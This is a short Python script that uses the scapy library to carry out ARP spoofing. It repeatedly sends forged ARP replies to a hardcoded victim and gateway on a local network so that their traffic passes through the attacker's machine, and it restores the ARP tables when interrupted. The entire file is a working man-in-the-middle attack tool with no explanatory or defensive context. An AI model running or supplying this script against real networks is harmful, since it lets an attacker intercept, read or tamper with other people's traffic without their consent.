#!/usr/bin/env python

import scapy.layers.l2 as l2
import scapy.all as scapy
import time

victim_ip = "192.168.1.2"
gateway_ip = "192.168.1.1"


def get_mac(ip):
    arp_request = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast/arp_request
    answered_list = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0]
    return answered_list[0][1].hwsrc


def spoof(target_ip: str, spoof_ip: str):
    target_mac = get_mac(target_ip)
    packet = l2.ARP(pdst=target_ip, hwdst=target_mac, psrc=spoof_ip, op='is-at')
    scapy.send(packet, verbose=False)


def restore(destination_ip, source_ip):
    destination_mac = get_mac(destination_ip)
    source_mac = get_mac(source_ip)
    packet = scapy.ARP(op=2, pdst=destination_ip, hwdst=destination_mac, psrc=source_ip, hwsrc=source_mac)
    scapy.send(packet, count=10, verbose=False)


sent_packet = 0

try:
    while True:
        spoof(victim_ip, gateway_ip)
        spoof(gateway_ip, victim_ip)
        sent_packet += 2
        print("\r[+] Packets sent: " + str(sent_packet), end="")
        time.sleep(2)
except KeyboardInterrupt:
    print("\n[-] Detected CTRL + C ... Resetting ARP tables..... Please wait.\n")
    restore(victim_ip, gateway_ip)
    restore(gateway_ip, victim_ip)
